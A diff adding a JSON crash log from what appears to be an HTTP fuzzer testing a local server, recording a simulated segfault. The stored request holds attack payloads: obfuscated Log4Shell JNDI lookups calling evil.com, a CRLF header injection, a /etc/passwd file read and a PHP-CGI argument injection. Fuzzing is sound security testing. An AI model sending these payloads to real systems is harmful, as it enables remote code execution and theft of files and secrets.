@@ -1,0 +1,23 @@
+{
+  "timestamp": "2025-12-29T14:40:17.191244",
+  "crash_type": "segfault",
+  "payload": "PUT /proc/self/environ\u560a\u560dSet-Cookie: evil=true?\nHeaders: {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Accept-Encoding': '${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'Authorization': '${${lower:j}ndi:ldap://evil.com/a}', 'Content-Length': 'file:///etc/passwd', 'Referer': '-d auto_prepend_file=php://input'}",
+  "payload_hash": "3603e84f88a3d7cc",
+  "request_method": "PUT",
+  "request_path": "/proc/self/environ\u560a\u560dSet-Cookie: evil=true?",
+  "request_headers": {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Accept-Encoding": "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "Authorization": "${${lower:j}ndi:ldap://evil.com/a}",
+    "Content-Length": "file:///etc/passwd",
+    "Referer": "-d auto_prepend_file=php://input"
+  },
+  "request_body": "",
+  "error_message": "Simulated segfault",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 566
+}
